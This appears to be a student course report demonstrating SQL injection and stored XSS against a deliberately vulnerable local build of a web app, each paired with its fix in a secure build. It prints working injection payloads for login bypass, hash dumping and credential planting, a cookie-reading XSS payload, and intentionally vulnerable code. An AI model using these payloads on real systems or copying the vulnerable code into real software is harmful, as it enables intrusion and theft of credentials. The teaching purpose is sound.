# Attack Report — Comunication_LTD

This report documents the two vulnerabilities the project demonstrates, per the course brief §6/§7.
Each is shown **succeeding against the vulnerable build** (`:3001`, `vulnerable_app_db`) and
**failing against the secure build** (`:3000`, `secure_app_db`). The two builds are byte-identical
except for five files (`routes/auth.js`, `routes/password.js`, `routes/customers.js`,
`public/js/system.js`, `.env.example`); the vulnerability lives entirely in those files.

> **How to reproduce:** run both apps side by side —
> `npm --prefix secure start` (→ :3000) and `npm --prefix vulnerable start` (→ :3001) — then follow
> the payloads below. `npm run db:seed` in each tree creates a demo login (`demo` / `Comm7#Ltdxyz`).

---

## Summary

| # | Vulnerability | Location (vulnerable build) | Payload | Secure fix |
|---|---|---|---|---|
| 1a | SQL Injection — auth bypass (§3 Login) | `routes/auth.js` (login) | `' OR '1'='1' -- ` | `pool.execute(sql, params)` |
| 1b | SQL Injection — data leak (§4 System) | `routes/customers.js` (search) | `' UNION SELECT … FROM users -- ` | `pool.execute(sql, params)` |
| 1c | SQL Injection — column injection (§1 Register) | `routes/auth.js` (register) | `victim', 'attacker@evil.com', … ) -- ` | `pool.execute(sql, params)` |
| 2 | Stored XSS (§4 System) | `public/js/system.js` (render) | `<img src=x onerror="alert(document.cookie)">` | `el.textContent = …` |

> **Coverage of the brief's Part B:** Stored XSS on §4; SQL Injection on §1 (Register, 1c), §3
> (Login, 1a) and §4 (System, 1b); XSS fixed by output encoding (`textContent`); SQLi fixed by
> parameterized queries.

---

## Vulnerability 1 — SQL Injection

### 1a. Authentication bypass (login)

**Where.** `vulnerable/routes/auth.js` builds the login SQL by concatenating the username into the
query text and running it with `pool.query()`. Because passwords are salted per user, the credential
check is a *second* concatenated query (`username` + `password_hash`); the injected `-- ` comments it
out, so any password is accepted.

**Request.**
```
POST /api/login   (to :3001)
Content-Type: application/json

{ "username": "' OR '1'='1' -- ", "password": "anything" }
```

**What happens.** The username lookup becomes:
```sql
SELECT id, salt, is_locked, failed_login_attempts
FROM users WHERE username = '' OR '1'='1' -- '
```
which returns the first user, and the credential-check query becomes:
```sql
SELECT id FROM users WHERE username = '' OR '1'='1' -- ' AND password_hash = '<hash-of-anything>'
```
The `-- ` comments out `' AND password_hash = '…'`, so a row is returned and the attacker is logged
in **without knowing any password**.

**Impact.** Full authentication bypass — the attacker gets a valid session as an existing user.

> **Browser note.** The login page trims the username client-side, which strips the trailing space
> the `-- ` comment needs. In the **browser** use the equivalent `#` comment — `' OR '1'='1'#` —
> which needs no space. The `-- ` form works at the API/`curl` level (no client trim).

**Result.**
- **Vulnerable `:3001`** → `200 OK`, session cookie set. *(screenshot: `screenshots/01-sqli-login-3001-success.png`)*
- **Secure `:3000`** → `401 Unauthorized`. *(screenshot: `screenshots/02-sqli-login-3000-fail.png`)*

**The fix (secure build).** Input is a bound parameter — it can never be parsed as SQL:
```js
// secure/routes/auth.js
const [rows] = await pool.execute(
  'SELECT id, password_hash, salt, failed_login_attempts, is_locked FROM users WHERE username = ?',
  [username],
);
// …and the password is verified in application code with crypto.timingSafeEqual, not in SQL.
```
```js
// vulnerable/routes/auth.js   // !! INTENTIONALLY VULNERABLE — see SPEC.md §10.2 !!
const [rows] = await pool.query(
  `SELECT id, salt, is_locked, failed_login_attempts FROM users WHERE username = '${username}'`,
);
const candidateHash = hashPassword(password, user.salt);
const [authRows] = await pool.query(
  `SELECT id FROM users WHERE username = '${username}' AND password_hash = '${candidateHash}'`,
);
```

### 1b. Data exfiltration via UNION (customer search)

**Where.** `vulnerable/routes/customers.js` concatenates the `?search=` term into a `LIKE` clause.

**Request.**
```
GET /api/customers?search=' UNION SELECT id, username, password_hash, salt, 1, 1, 1, NOW() FROM users --    (to :3001, authenticated)
```

**What happens.** The query becomes:
```sql
SELECT id, name, email, phone, sector, package, created_by, created_at
FROM customers WHERE name LIKE '%' UNION SELECT id, username, password_hash, salt, 1,1,1,NOW() FROM users -- %' ORDER BY id DESC
```
The `-- ` comments out the trailing `%' ORDER BY …`. The response now contains **every `users` row** —
usernames in the `name` field and `password_hash` values in the `email` field.

**Impact.** Full disclosure of the `users` table, including password hashes and salts.

**Result.**
- **Vulnerable `:3001`** → rows from `users` returned (username + `password_hash` leaked). *(screenshot: `screenshots/03-sqli-union-3001-leak.png`)*
- **Secure `:3000`** → the payload is treated as a literal search string; `200` with no matching rows and no `users` data. *(screenshot: `screenshots/04-sqli-union-3000-safe.png`)*

**The fix (secure build).**
```js
// secure/routes/customers.js
const [rows] = await pool.execute(
  'SELECT … FROM customers WHERE name LIKE ? ORDER BY id DESC',
  ['%' + search + '%'],   // the % wraps the VALUE, never the SQL
);
```

### 1c. Column injection on Register (§1)

**Where.** `vulnerable/routes/auth.js` builds the register `INSERT` by concatenating the username and
email into the `VALUES` list.

**Request.**
```
POST /api/register   (to :3001)
{ "username": "victim', 'attacker@evil.com', '<hash>', '<salt>') -- ",
  "email": "ignored@x.com", "password": "Kq7#mxzptvwR" }
```

**What happens.** The username closes the first value and supplies the remaining columns itself; `-- `
comments out the app's real email/hash/salt:
```sql
INSERT INTO users (username, email, password_hash, salt)
VALUES ('victim', 'attacker@evil.com', '<hash>', '<salt>') -- ', 'ignored@x.com', '<realhash>', '<realsalt>')
```
The stored row now carries an **attacker-chosen `password_hash`** (and email). The attacker can set the
hash to the HMAC of a password they know and then log in as that account.

**Impact.** Account creation with attacker-controlled stored credentials/columns.

**Result.**
- **Vulnerable `:3001`** → the injected email + hash land in `users`.
- **Secure `:3000`** → the username is a bound parameter and is never parsed as SQL; nothing is injected.

**The fix (secure build).** Parameterized insert:
```js
// secure/routes/auth.js
await conn.execute(
  'INSERT INTO users (username, email, password_hash, salt) VALUES (?, ?, ?, ?)',
  [username, email, passwordHash, salt],
);
```

**Note — `multipleStatements` stays `false` in both builds.** The demo relies on `OR`/`UNION`/breakout,
never stacked statements (`; DROP TABLE …`), so a successful SQLi cannot execute a second statement. The
two databases are also separate schemas (SPEC §3), so a destructive payload on `:3001` cannot touch
`secure_app_db`.

---

## Vulnerability 2 — Stored Cross-Site Scripting (XSS)

**Where.** `vulnerable/public/js/system.js` renders customer names with `innerHTML`. The name is
stored **verbatim in both builds** — sanitising on input is deliberately *not* done (SPEC §13), because
escaping is an output concern. The flaw is purely at render.

**Payload (entered as a customer name).**
```
<img src=x onerror="alert(document.cookie)">
```

**What happens.** On the vulnerable build the browser parses the stored string as HTML; the broken
`<img>` triggers its `onerror` handler and the script executes.

**Proof it is *stored*, not reflected.** Log out, log back in, and load `system.html` fresh — the
list re-renders from `GET /api/customers` and the payload **fires again with no attacker interaction**.

**Impact.** Arbitrary JavaScript in the victim's session — here it reads `document.cookie`; in a real
attack it could exfiltrate the session or act on the user's behalf.

**Result.**
- **Vulnerable `:3001`** → `alert` fires on submit. *(screenshot: `screenshots/05-xss-3001-alert.png`)*
- **Vulnerable `:3001`** → `alert` fires again after logout + re-login (persistence). *(screenshot: `screenshots/06-xss-3001-persist.png`)*
- **Secure `:3000`** → the payload renders as **visible literal text**; no alert, no `<img>` in the DOM. *(screenshot: `screenshots/07-xss-3000-inert.png`)*

**The fix (secure build).**
```js
// secure/public/js/system.js
lastCustomer.textContent = customer.name;   // shown as inert text
li.textContent = customer.name;
```
```js
// vulnerable/public/js/system.js   // !! INTENTIONALLY VULNERABLE — see SPEC.md §10.1 !!
lastCustomer.innerHTML = customer.name;     // parsed as markup -> executes
li.innerHTML = customer.name;
```

---

## Client-side validation is **not** a security control

The registration and password forms validate on the client, but that is a **convenience only**. Every
security decision — password policy, history, lockout, token validity, and the two vulnerabilities
above — is enforced (or, in the vulnerable build, broken) **on the server**. The proof: the payloads
above call the API directly with `curl`, bypassing the browser entirely,
and the server behaves identically. For example, a policy-violating password sent straight to the API
is still rejected `400` by the secure build with no browser involved:
```
curl -s -X POST http://localhost:3000/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"x","email":"x@x.com","password":"weak"}'
# -> {"error":"Password does not meet the policy.","details":[ … ]}
```
An attacker never uses your form, so client-side checks protect nothing.

---

## Deliberate deviations from secure practice (SPEC §14)

The brief mandates several things a production system should not do. They are implemented as specified
and listed here so they read as informed choices, not oversights.

| # | What the brief requires | Why it is weak | The safe alternative |
|---|---|---|---|
| D1 | Login says whether the **username** exists ("User does not exist.") | Enables **username enumeration** — an attacker can harvest valid accounts | Return one generic message for both cases: "Invalid username or password." |
| D2 | Passwords stored as **HMAC-SHA256 + salt** | HMAC is *fast*; a stolen database is brute-forceable at scale | Use a slow, memory-hard KDF: **bcrypt / scrypt / Argon2** |
| D3 | The emailed reset value **equals** the value stored in `reset_token` (SHA-1) | A database read yields working reset tokens; SHA-1 is also collision-broken | Store `hash(token)`; email the raw token, compare hashes on redemption |
| D4 | Account **locks permanently** after N failures (until reset) | Enables a trivial **denial of service** against a known username | Time-based lockout with exponential backoff, or CAPTCHA after N attempts |

No CSRF protection is specified by the brief. Session cookies are set `httpOnly`, `sameSite:'lax'`
(which blunts cross-site POSTs) and `secure` when served over TLS; a CSRF token is noted as future work.

---

## Screenshots

Capture these into `docs/screenshots/` (see `docs/screenshots/README.md` for the exact steps). Each is
referenced from the sections above.

| File | Shows |
|---|---|
| `01-sqli-login-3001-success.png` | `' OR '1'='1' -- ` logs in on :3001 (200 / reaches system page) |
| `02-sqli-login-3000-fail.png` | Same payload rejected on :3000 (error message) |
| `03-sqli-union-3001-leak.png` | UNION payload returns `users` rows (usernames + hashes) on :3001 |
| `04-sqli-union-3000-safe.png` | Same payload returns no user data on :3000 |
| `05-xss-3001-alert.png` | XSS payload fires `alert(document.cookie)` on submit, :3001 |
| `06-xss-3001-persist.png` | XSS fires again after logout + re-login (stored), :3001 |
| `07-xss-3000-inert.png` | Same payload shown as literal text on :3000, no alert |
| `08-sqli-register-3001-inject.png` | Register on :3001 with the breakout payload (DevTools shows the payload) |
| `08b-sqli-register-3001-backdoor-login.png` | Logging in as the SQLi-created `backdoor` account on :3001 (optional) |
| `09-sqli-register-3000-safe.png` | On :3000 the `backdoor` login is refused — no injected account was created |
